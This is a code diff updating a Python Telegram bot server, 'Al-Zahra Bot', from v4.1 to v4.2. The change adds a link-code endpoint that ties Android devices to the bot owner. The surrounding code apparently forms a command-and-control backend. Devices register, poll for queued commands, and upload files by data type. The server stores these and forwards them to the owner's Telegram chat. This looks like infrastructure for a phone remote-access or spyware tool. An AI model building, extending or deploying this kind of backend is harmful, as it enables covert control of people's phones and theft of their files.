@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Al-Zahra Bot v4.1 - Server Side with Link System
+Al-Zahra Bot v4.2 - Server Side with Real Link Verification
 """
 
 import asyncio
@@ -9,7 +9,6 @@ import logging
 import os
 import random
 import time
-import zipfile
 from datetime import datetime
 from aiohttp import web
 
@@ -29,10 +28,10 @@ PORT = 8443
 # ═══════════════════════════════════════════
 class DataStore:
     def __init__(self):
-        self.devices = {}  # {device_id: device_info}
-        self.pending_commands = {}  # {device_id: [commands]}
-        self.link_codes = {}  # {code: device_id}
-        self.device_files = {}  # {device_id: [file_paths]}
+        self.devices = {}
+        self.pending_commands = {}
+        self.link_codes = {}  # {code: {"chat_id": ..., "time": ..., "device_id": ...}}
+        self.device_files = {}
         self.last_update_id = 0
 
 data_store = DataStore()
@@ -126,7 +125,8 @@ def get_devices_menu():
     for device_id, info in devices.items():
         model = info.get("model", "غير معروف")
         status = "🟢" if info.get("online", False) else "🔴"
-        buttons.append([{"text": f"{status} {model}", "callback_data": f"device_{device_id}"}])
+        linked = "✅" if info.get("linked", False) else "⏳"
+        buttons.append([{"text": f"{status}{linked} {model}", "callback_data": f"device_{device_id}"}])
     
     buttons.append([{"text": "🔄 تحديث", "callback_data": "devices_list"}])
     buttons.append([{"text": "🔙 رجوع", "callback_data": "back_main"}])
@@ -170,7 +170,6 @@ async def handle_message(message):
         await send_message(chat_id, "⛔ غير مصرح لك باستخدام هذا البوت")
         return
     
-    # الأوامر
     if text == "/start" or text == "/help":
         await send_message(
             chat_id,
@@ -181,8 +180,17 @@ async def handle_message(message):
     elif text == "/link":
         # توليد كود ربط جديد
         code = generate_link_code()
-        # حفظ الكود مؤقتاً
-        data_store.link_codes[code] = {"chat_id": chat_id, "time": time.time()}
+        
+        # التحقق من عدم وجود كود مشابه
+        while code in data_store.link_codes:
+            code = generate_link_code()
+        
+        # حفظ الكود
+        data_store.link_codes[code] = {
+            "chat_id": chat_id,
+            "time": time.time(),
+            "device_id": None
+        }
         
         await send_message(
             chat_id,
@@ -202,36 +210,8 @@ async def handle_message(message):
     elif text == "/status":
         await show_system_status(chat_id)
     
-    elif len(text) == 9 and text.isdigit():
-        # التحقق من كود الربط
-        await verify_link_code(chat_id, text)
-    
     else:
         await send_message(chat_id, "❓ أمر غير معروف. استخدم /start")
-
-async def verify_link_code(chat_id, code):
-    """التحقق من كود الربط"""
-    if code in data_store.link_codes:
-        link_info = data_store.link_codes[code]
-        
-        # التحقق من صلاحية الكود (5 دقائق)
-        if time.time() - link_info["time"] > 300:
-            del data_store.link_codes[code]
-            await send_message(chat_id, "⏰ الكود منتهي الصلاحية. أرسل /link للحصول على كود جديد")
-            return
-        
-        # ربط الجهاز
-        device_id = link_info.get("device_id")
-        if device_id:
-            data_store.devices[device_id]["linked"] = True
-            data_store.devices[device_id]["owner"] = chat_id
-            del data_store.link_codes[code]
-            
-            await send_message(chat_id, f"✅ تم ربط الجهاز بنجاح!\n\n📱 {data_store.devices[device_id].get('model', 'غير معروف')}")
-        else:
-            await send_message(chat_id, "⏳ في انتظار اتصال الجهاز...")
-    else:
-        await send_message(chat_id, "❌ كود غير صحيح")
 
 async def handle_callback(callback_query):
     chat_id = callback_query.get("message", {}).get("chat", {}).get("id")
@@ -245,7 +225,6 @@ async def handle_callback(callback_query):
     
     logger.info(f"Callback: {data}")
     
-    # التنقل الرئيسي
     if data == "back_main":
         await edit_message(chat_id, message_id, f"🎛️ *لوحة تحكم Al-Zahra*\n\n⏰ {get_timestamp()}", reply_markup=get_main_menu())
     
@@ -254,7 +233,14 @@ async def handle_callback(callback_query):
     
     elif data == "link_device":
         code = generate_link_code()
-        data_store.link_codes[code] = {"chat_id": chat_id, "time": time.time()}
+        while code in data_store.link_codes:
+            code = generate_link_code()
+        
+        data_store.link_codes[code] = {
+            "chat_id": chat_id,
+            "time": time.time(),
+            "device_id": None
+        }
         
         await edit_message(
             chat_id, message_id,
@@ -271,7 +257,6 @@ async def handle_callback(callback_query):
     elif data == "system_status":
         await show_system_status(chat_id, message_id)
     
-    # الأجهزة
     elif data.startswith("device_"):
         device_id = data.replace("device_", "")
         if device_id in data_store.devices:
@@ -279,13 +264,13 @@ async def handle_callback(callback_query):
             text = f"📱 *{device.get('model', 'غير معروف')}*\n\n"
             text += f"🤖 Android {device.get('android', 'N/A')}\n"
             text += f"الحالة: {'🟢 متصل' if device.get('online') else '🔴 غير متصل'}\n"
+            text += f"الربط: {'✅ مرتبط' if device.get('linked') else '⏳ في الانتظار'}\n"
             text += f"آخر اتصال: {device.get('last_seen', 'N/A')}"
             
             await edit_message(chat_id, message_id, text, reply_markup=get_device_menu(device_id))
         else:
             await answer_callback(query_id, "❌ الجهاز غير متصل")
     
-    # أوامر الجهاز
     elif data.startswith("cmd_"):
         parts = data.split("_", 2)
         if len(parts) >= 3:
@@ -303,7 +288,6 @@ async def handle_callback(callback_query):
             else:
                 await answer_callback(query_id, "❌ الجهاز غير متصل")
     
-    # الإعدادات
     elif data == "settings_permissions":
         await edit_message(chat_id, message_id, "🔐 *التحكم بالصلاحيات*", reply_markup=get_permissions_menu())
     
@@ -348,7 +332,8 @@ async def show_devices(chat_id, message_id=None):
         text = "📱 *الأجهزة المتصلة*\n\n"
         for device_id, info in devices.items():
             status = "🟢" if info.get("online", False) else "🔴"
-            text += f"{status} {info.get('model', 'غير معروف')}\n"
+            linked = "✅" if info.get("linked", False) else "⏳"
+            text += f"{status}{linked} {info.get('model', 'غير معروف')}\n"
     
     if message_id:
         await edit_message(chat_id, message_id, text, reply_markup=get_devices_menu())
@@ -406,31 +391,93 @@ async def get_updates():
 # ═══════════════════════════════════════════
 # خادم الويب
 # ═══════════════════════════════════════════
-async def handle_device_register(request):
+async def handle_verify_code(request):
+    """التحقق من كود الربط من التطبيق"""
     try:
         data = await request.json()
-        device_id = data.get("device_id")
+        code = data.get("code", "")
+        device_id = data.get("device_id", "")
         model = data.get("model", "Unknown")
         android = data.get("android", "Unknown")
-        device_code = data.get("device_code")
         
+        logger.info(f"Verify code request: {code} from {model}")
+        
+        # التحقق من وجود الكود
+        if code not in data_store.link_codes:
+            return web.json_response({
+                "status": "error",
+                "message": "كود غير صحيح أو منتهي الصلاحية"
+            })
+        
+        link_info = data_store.link_codes[code]
+        
+        # التحقق من صلاحية الكود (5 دقائق)
+        if time.time() - link_info["time"] > 300:
+            del data_store.link_codes[code]
+            return web.json_response({
+                "status": "error",
+                "message": "الكود منتهي الصلاحية"
+            })
+        
+        # ربط الجهاز
+        link_info["device_id"] = device_id
+        
+        # تسجيل الجهاز
         data_store.devices[device_id] = {
             "model": model,
             "android": android,
             "online": True,
             "last_seen": get_timestamp(),
             "registered": get_timestamp(),
-            "linked": False
+            "linked": True,
+            "owner": link_info["chat_id"]
         }
         
-        # ربط بالكود إذا وجد
-        if device_code and device_code in data_store.link_codes:
-            data_store.link_codes[device_code]["device_id"] = device_id
-            data_store.devices[device_id]["linked"] = True
+        # حذف الكود بعد الاستخدام
+        del data_store.link_codes[code]
+        
+        logger.info(f"Device linked: {device_id} ({model})")
+        
+        # إشعار المالك
+        await send_message(
+            link_info["chat_id"],
+            f"✅ تم ربط جهاز جديد!\n\n📱 {model}\n🤖 Android {android}"
+        )
+        
+        return web.json_response({
+            "status": "ok",
+            "device_id": device_id,
+            "message": "تم الربط بنجاح"
+        })
+        
+    except Exception as e:
+        logger.error(f"Verify code error: {e}")
+        return web.json_response({
+            "status": "error",
+            "message": "خطأ في الخادم"
+        })
+
+async def handle_device_register(request):
+    try:
+        data = await request.json()
+        device_id = data.get("device_id")
+        model = data.get("model", "Unknown")
+        android = data.get("android", "Unknown")
+        
+        if device_id in data_store.devices:
+            data_store.devices[device_id]["online"] = True
+            data_store.devices[device_id]["last_seen"] = get_timestamp()
+        else:
+            data_store.devices[device_id] = {
+                "model": model,
+                "android": android,
+                "online": True,
+                "last_seen": get_timestamp(),
+                "registered": get_timestamp(),
+                "linked": False
+            }
         
         logger.info(f"Device registered: {device_id} ({model})")
-        
-        await send_message(OWNER_CHAT_ID, f"🟢 جهاز جديد متصل!\n📱 {model}\n🤖 Android {android}")
         
         return web.json_response({"status": "ok"})
         
@@ -456,7 +503,6 @@ async def handle_device_data(request):
             elif part.name == "type":
                 data_type = await part.text()
             elif part.name == "file":
-                # حفظ الملف
                 upload_dir = "/opt/alzahra/uploads"
                 os.makedirs(upload_dir, exist_ok=True)
                 
@@ -475,10 +521,8 @@ async def handle_device_data(request):
                 data_store.device_files[device_id] = []
             data_store.device_files[device_id].append({"type": data_type, "path": file_path})
             
-            # إرسال إشعار للمالك
             await send_message(OWNER_CHAT_ID, f"📥 بيانات جديدة من {device_id}\n📁 النوع: {data_type}")
             
-            # إرسال الملف مباشرة
             if file_path and os.path.exists(file_path):
                 await send_document(OWNER_CHAT_ID, file_path, f"📱 {device_id} - {data_type}")
         
@@ -512,6 +556,7 @@ async def handle_device_status(request):
 
 async def init_web_app():
     app = web.Application()
+    app.router.add_post("/api/verify_code", handle_verify_code)
     app.router.add_post("/api/register", handle_device_register)
     app.router.add_post("/api/data", handle_device_data)
     app.router.add_get("/api/commands", handle_get_commands)
@@ -523,7 +568,7 @@ async def init_web_app():
 # ═══════════════════════════════════════════
 async def main():
     logger.info("=" * 50)
-    logger.info("  Al-Zahra Bot v4.1 Starting...")
+    logger.info("  Al-Zahra Bot v4.2 Starting...")
     logger.info("=" * 50)
     
     web_app = await init_web_app()
@@ -543,6 +588,7 @@ async def main():
                       if current_time - info["time"] > 300]
             for code in expired:
                 del data_store.link_codes[code]
+                logger.info(f"Expired code removed: {code}")
     
     await asyncio.gather(get_updates(), cleanup_codes())
 
